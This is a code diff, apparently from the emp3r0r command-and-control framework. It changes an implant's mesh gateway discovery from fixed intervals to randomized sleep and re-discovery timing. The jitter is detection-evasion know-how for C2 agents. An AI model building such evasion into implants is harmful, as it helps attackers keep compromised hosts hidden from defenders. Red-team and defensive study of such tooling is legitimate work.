@@ -19,6 +19,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 var (
@@ -76,7 +77,7 @@ func Start(ctx context.Context) {
 	gossipPort := meshGossipPort()
 	logging.Infof("Mesh: starting gossip on port %d (direct-c2=%v)", gossipPort, common.RuntimeConfig.IsDirectC2Enabled)
 
-	list, err := transport.StartGossip(ctx, common.RuntimeConfig.InitialPeers, gossipPort, currentMeta)
+	list, err := transport.StartGossip(ctx, common.RuntimeConfig.AgentUUID, common.RuntimeConfig.InitialPeers, gossipPort, currentMeta)
 	if err != nil {
 		logging.Errorf("Mesh: gossip failed: %v — operating without peer discovery", err)
 	} else {
@@ -219,36 +220,31 @@ func watchPeers(ctx context.Context) {
 		if tryPeers() {
 			break
 		}
-		logging.Debugf("Mesh: no gateway found yet, retrying in 3s")
+		interval := time.Duration(util.RandInt(3000, 10000)) * time.Millisecond
+		logging.Debugf("Mesh: no gateway found yet, retrying in %v", interval)
 		select {
 		case <-ctx.Done():
 			return
-		case <-time.After(3 * time.Second):
+		case <-time.After(interval):
 		}
 	}
 
-	// After first gateway is found, maintain it: health-check every 5s,
-	// full re-discover every 10s.
-	healthTicker := time.NewTicker(5 * time.Second)
-	rediscoverTicker := time.NewTicker(10 * time.Second)
-	defer healthTicker.Stop()
-	defer rediscoverTicker.Stop()
-
+	// After first gateway is found, maintain it: health-check and re-discover
+	// on a randomized schedule.
 	for {
-		select {
-		case <-ctx.Done():
+		// Randomized sleep
+		util.TakeASnap(false)
+
+		if ctx.Err() != nil {
 			return
-		case <-healthTicker.C:
-			checkCurrentGateway()
-			// If the gateway was just cleared, immediately try peers.
-			if GetGatewayIP() == "" {
-				if !tryPeers() {
-					logging.Warningf("Mesh: no reachable gateway found during re-discovery")
-				}
+		}
+
+		checkCurrentGateway()
+		// If the gateway was just cleared, or periodically, try peers.
+		if GetGatewayIP() == "" || util.RandInt(0, 5) == 0 {
+			if !tryPeers() {
+				logging.Warningf("Mesh: no reachable gateway found during re-discovery")
 			}
-		case <-rediscoverTicker.C:
-			// Periodic full re-scan to pick up better/new gateways.
-			tryPeers()
 		}
 	}
 }
